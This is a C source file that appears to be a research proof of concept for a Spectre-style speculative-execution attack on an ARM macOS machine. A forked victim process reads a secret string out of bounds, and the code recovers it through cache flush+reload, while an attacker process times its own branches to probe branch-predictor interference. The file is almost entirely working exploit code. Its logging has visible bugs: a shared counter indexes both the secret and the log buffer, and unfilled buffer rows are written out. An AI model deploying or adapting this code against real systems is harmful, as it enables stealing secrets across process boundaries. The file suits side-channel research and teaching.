#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>

#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <_types/_uint32_t.h>

#include "./utils.c"

#define MAX_LINES 5000000
#define MAX_LINE_LENGTH 100

const char *secret = "SECRET";
int size = 10;
uint8_t temp = 0;
char __attribute__((aligned(4096))) array[256 * 4096];

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline))
uint64_t rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

void victim(int input){
    if (input < size) {
		temp = array[input * 4096 + 32];
	}
	// if (input){
	// 	__asm__ __volatile__(
    //     ".rept 8000\n\t"
    //     "nop\n\t"
    //     ".endr\n\t"
    //     :::);
	// }
    else {
		__asm__ __volatile__(
        ".rept 8000\n\t"
        "nop\n\t"
        ".endr\n\t"
        :::);
    }
}

void f1(int input1, int input2, int flag){
    (void)(flag && (victim(input2), 0));
	if (input1){
		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
	}
    else {
		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
    }
}

void dummy(){
    __asm__ __volatile__(
    ".rept 7191\n\t"
    "nop\n\t"
    ".endr\n\t"
    :::);
}

void attacker(int input){
	if (input){
		__asm__ __volatile__(
        ".rept 8000\n\t"
        "nop\n\t"
        ".endr\n\t"
        :::);
	}
    else {
		__asm__ __volatile__(
        ".rept 8000\n\t"
        "nop\n\t"
        ".endr\n\t"
        :::);
    }
}

int main() {
    uint32_t CORE_ID = 3;
    volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
    if (ret == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return EXIT_FAILURE;
    }
    
    pid_t pid = fork();

    if (pid < 0) {
        perror("fork failed");
        exit(1);
    } 
    else if (pid == 0) {
        // Child = Victim
        // CORE_ID = 0;
        volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
        if (ret == -1)
        {
            printf("Error setting CPU core affinity. Please run as root\n");
            return EXIT_FAILURE;
        }

        char (*lines)[MAX_LINE_LENGTH] = malloc(sizeof(char[MAX_LINES][MAX_LINE_LENGTH]));
        if (!lines) {
            perror("malloc failed");
            return 1;
        }

        int testsec = 5;
        srand(time(NULL));
        uint64_t now, start;
        int n = 0;
        
        FILE *fp = fopen("p1.txt", "w");
        printf("[Victim] address of victim: %p\n", victim);

        asm volatile("mrs %[start], S3_2_c15_c0_0" : [start]"=r"(start));
        while(1) {
            usleep(10);
            
            /*********** Spectre ************/
            // Flush the Probe array
            memset(array, 0, sizeof(array));
            for (size_t i = 0; i < 256; i++) {
                flush(array + i * 4096);
            }
            
            // Reading out-of-bound value
            flush(&size);
            victim(secret[n++ % 6]);

            // Recover the secret
            for(size_t i=0;  i<=255; i++){
                if(flush_reload((char *)array+4096 *i)){
                    // printf("The secret is :%ld\n", i);
                    printf("%ld\n", i);
                }
            }
            /*********** Spectre ************/

            int input = rand() % 2;

            victim(0); // victim branch
            asm volatile("dsb sy" ::: "memory");
            asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
            // fprintf(fp, "%llu\n", now);
            snprintf(lines[n++], MAX_LINE_LENGTH, "%llu\n", now);
            if ((now - start) >= (uint64_t)testsec * 1000000000ULL) {
                break;
            }
        }

        for (int i = 0; i < MAX_LINES; ++i) {
            fputs(lines[i], fp);
        }
        fclose(fp);
        free(lines);
        printf("Victim(Child) End\n");
    } 
    else {
        // Parent = Attacker
        
        /*********** Spectre ************/
        // Mistraining
        // for(size_t i=0; i<n_train; i++){
        //         flush(&size);
        //         victim(i);
        // }
        /*********** Spectre ************/
        
        char (*lines)[MAX_LINE_LENGTH] = malloc(sizeof(char[MAX_LINES][MAX_LINE_LENGTH]));
        if (!lines) {
            perror("malloc failed");
            return 1;
        }

        uint64_t t1, t2, now, start;
        uint64_t latency;
        int testsec = 15; // not second. cycle-based
        int n = 0;

        FILE *fp = fopen("p2.txt", "w");
        printf("[Attacker] address of attacker: %p\n", attacker);

        asm volatile("mrs %[start], S3_2_c15_c0_0" : [start]"=r"(start));
        uint64_t previous = start;
        while(1) {		
            asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
            asm volatile("dsb sy" ::: "memory");
            attacker(1); // attacker branch
            asm volatile("dsb sy" ::: "memory");
            asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
            latency = t2 - t1;

            asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
            // fprintf(fp, "%llu, %llu, %llu, %llu\n", t1, t2, t2 - t1, now - previous);
            snprintf(lines[n++], MAX_LINE_LENGTH, "%llu, %llu, %llu, %llu\n", t1, t2, t2 - t1, now - previous);
            previous = now;
            if ((now - start) >= (uint64_t)testsec * 1000000000ULL) {
                break;
            }
        }

        for (int i = 0; i < MAX_LINES; ++i) {
            fputs(lines[i], fp);
        }
        fclose(fp);
        free(lines);
        printf("Attacker(Parent) End\n");
    }

    return 0;
}
